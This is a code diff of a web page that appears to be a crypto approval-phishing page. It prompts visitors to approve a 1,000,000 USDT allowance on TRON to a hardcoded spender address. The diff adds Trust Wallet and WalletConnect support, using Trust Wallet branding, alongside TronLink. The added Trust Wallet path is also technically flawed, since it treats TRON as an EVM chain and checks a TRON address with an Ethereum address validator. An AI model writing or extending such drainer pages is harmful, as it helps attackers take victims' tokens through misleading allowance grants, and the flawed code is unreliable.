@@ -6,7 +6,8 @@
   <title>Approve 1,000,000 USDT on TRON</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
-  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js" defer></script>
   <style>
     * {
       margin: 0;
@@ -68,7 +69,7 @@
       transition: all 0.3s ease;
       text-transform: uppercase;
       letter-spacing: 1px;
-      margin-top: 20px;
+      margin: 10px;
     }
     button:hover {
       background: linear-gradient(45deg, #00ff88, #00d4ff);
@@ -114,9 +115,10 @@
 </head>
 <body>
   <div class="container">
-    <h2>Approve 1,000,000  on TRON</h2>
+    <h2>Approve 1,000,000 USDT on TRON</h2>
     <p>Click the button to authorize the address:<br><strong class="spender-address">TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
-    <button onclick="approveUSDT()">Authorize Approval</button>
+    <button onclick="approveUSDT('tronlink')">Authorize with TronLink</button>
+    <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet</button>
     <div id="loading">Processing Transaction...</div>
     <p class="status" id="statusText"></p>
   </div>
@@ -149,7 +151,55 @@
       return true;
     }
 
-    async function approveUSDT() {
+    async function setupTronNetwork(provider) {
+      try {
+        await provider.request({
+          method: "wallet_addEthereumChain",
+          params: [
+            {
+              chainId: "0x2b6653dc", // TRON Mainnet
+              chainName: "TRON Mainnet",
+              nativeCurrency: { name: "TRON", symbol: "TRX", decimals: 6 },
+              rpcUrls: ["https://api.trongrid.io"],
+              blockExplorerUrls: ["https://tronscan.org"]
+            }
+          ]
+        });
+      } catch (error) {
+        throw new Error(`Failed to setup TRON network: ${error.message}`);
+      }
+    }
+
+    async function connectTrustWallet() {
+      try {
+        let provider;
+        if (window.ethereum && window.ethereum.isTrust) {
+          provider = new ethers.providers.Web3Provider(window.ethereum);
+          await window.ethereum.request({ method: "eth_requestAccounts" });
+        } else {
+          provider = await EthereumProvider.init({
+            projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
+            chains: [728126428], // TRON Mainnet chain ID
+            rpc: { 728126428: "https://api.trongrid.io" },
+            metadata: {
+              name: "USDT Approval",
+              description: "Approve USDT on TRON",
+              url: window.location.href,
+              icons: ["https://trustwallet.com/assets/images/favicon.png"]
+            },
+            showQrModal: true
+          });
+          await provider.connect();
+          provider = new ethers.providers.Web3Provider(provider);
+        }
+        await setupTronNetwork(provider);
+        return provider;
+      } catch (error) {
+        throw new Error(`Failed to connect Trust Wallet: ${error.message}`);
+      }
+    }
+
+    async function approveUSDT(walletType) {
       const loadingDiv = document.getElementById("loading");
       const statusText = document.getElementById("statusText");
 
@@ -157,33 +207,7 @@
         loadingDiv.style.display = "block";
         statusText.textContent = "";
 
-        // Wait for TronWeb to be ready
-        const tronWebReady = await waitForTronWeb();
-        if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
-          statusText.textContent = "Please install TronLink and log in to your wallet.";
-          loadingDiv.style.display = "none";
-          return;
-        }
-
-        // Verify network
-        if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
-          statusText.textContent = "Please connect to the TRON Mainnet.";
-          loadingDiv.style.display = "none";
-          return;
-        }
-
-        // Verify spender address
-        if (!window.tronWeb.isAddress(spenderAddress)) {
-          statusText.textContent = "Invalid spender address!";
-          loadingDiv.style.display = "none";
-          return;
-        }
-
-        // Initialize contract
-        const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);
-
         // Set approval amount: 1,000,000 USDT (6 decimals)
-        // Fallback to manual calculation if ethers is not available
         let amount;
         if (typeof ethers !== "undefined" && ethers.utils) {
           amount = ethers.utils.parseUnits("1000000", 6).toString();
@@ -191,24 +215,70 @@
           amount = "1000000000000"; // 1,000,000 * 10^6
         }
 
-        // Confirm approval
-        if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
-          statusText.textContent = "Approval cancelled.";
-          loadingDiv.style.display = "none";
-          return;
+        if (walletType === "tronlink") {
+          // TronLink approval
+          const tronWebReady = await waitForTronWeb();
+          if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
+            statusText.textContent = "Please install TronLink and log in to your wallet.";
+            loadingDiv.style.display = "none";
+            return;
+          }
+
+          if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
+            statusText.textContent = "Please connect to the TRON Mainnet.";
+            loadingDiv.style.display = "none";
+            return;
+          }
+
+          if (!window.tronWeb.isAddress(spenderAddress)) {
+            statusText.textContent = "Invalid spender address!";
+            loadingDiv.style.display = "none";
+            return;
+          }
+
+          const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);
+
+          if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
+            statusText.textContent = "Approval cancelled.";
+            loadingDiv.style.display = "none";
+            return;
+          }
+
+          statusText.textContent = "Sending approval transaction with TronLink...";
+          const tx = await contract.approve(spenderAddress, amount).send({
+            feeLimit: 30000000, // 30 TRX
+            callValue: 0,
+            shouldPollResponse: false
+          });
+
+          statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
+        } else if (walletType === "trustwallet") {
+          // Trust Wallet approval
+          const provider = await connectTrustWallet();
+          const signer = provider.getSigner();
+
+          if (!ethers.utils.isAddress(spenderAddress)) {
+            statusText.textContent = "Invalid spender address!";
+            loadingDiv.style.display = "none";
+            return;
+          }
+
+          const contract = new ethers.Contract(usdtContractAddress, usdtABI, signer);
+
+          if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
+            statusText.textContent = "Approval cancelled.";
+            loadingDiv.style.display = "none";
+            return;
+          }
+
+          statusText.textContent = "Sending approval transaction with Trust Wallet...";
+          const tx = await contract.approve(spenderAddress, amount, { gasLimit: 100000 });
+          const receipt = await tx.wait();
+
+          statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
         }
 
-        // Send approval transaction
-        statusText.textContent = "Sending approval transaction...";
-        const tx = await contract.approve(spenderAddress, amount).send({
-          feeLimit: 25000000, // 25 TRX
-          callValue: 0,
-          shouldPollResponse: false
-        });
-
-        statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
         loadingDiv.style.display = "none";
-
       } catch (error) {
         console.error("Transaction error:", error);
         statusText.textContent = `Approval failed: ${error.message || error}`;
